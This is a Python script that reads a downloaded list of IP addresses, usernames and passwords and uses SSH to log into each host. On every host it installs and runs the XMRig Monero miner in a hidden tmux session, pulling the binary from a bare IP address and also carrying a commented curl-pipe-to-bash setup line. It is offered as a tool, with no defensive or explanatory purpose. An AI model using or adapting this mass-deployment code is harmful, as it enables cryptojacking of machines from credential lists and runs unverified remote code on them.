#!/usr/local/bin/python
# deploy.py: Deploy Multiple VM's from csv on github

import csv # working with csv
import paramiko # SSH Client
import requests # used for Downloading the CSV file



# ===========================================================================================================================================
# VARS
# ===========================================================================================================================================

#set your URL HERE
url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/vms.csv'

# Set your commands here, one per line
sshcmd = [
    #" df -h" # Only used for Testing
    #"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s ADDR_HERE"
    # OLD method above new method below
    # 
    # "sudo yum install epel-release -y", # install epel-release on Centos!! to make sur you can get tmux + wget
    "sudo apt install wget tmux -y", # installs wget
    "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
    "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
    "tmux new-session -d -s 'xmrig' ./xmrig"
        
]



# ===========================================================================================================================================
# Do not edit below this line
# ===========================================================================================================================================

#download the latest csv file and save it as list.csv
req = requests.get(url)
url_content = req.content
csv_file = open("list.csv","wb")
csv_file.write(url_content)
csv_file.close()


with open('list.csv', 'r') as csvfile:  # opens file on desktop that we just saved
    reader = csv.DictReader(csvfile)
    for row in reader:


        print("Connecting to VM")
        print('IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])

        # Make the connection
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname= row['ip'], username=row['user'], password=row['pass'])
            except:
                print( "[!] ERROR CONNECTING TO ", row['ip'])
                
            
            #If we are here we should be connected?
            for command in sshcmd:
                print("="*50, command, "="*50)
                stdin, stdout, stderr = client.exec_command(command)
                print(stdout.read().decode())
                err = stderr.read().decode()
                if err:
                    print(err)
        except:
            print( "[!] ERROR, Timed out")
            
# TODO: Delete CSV file after, but fuck it i'm lazy

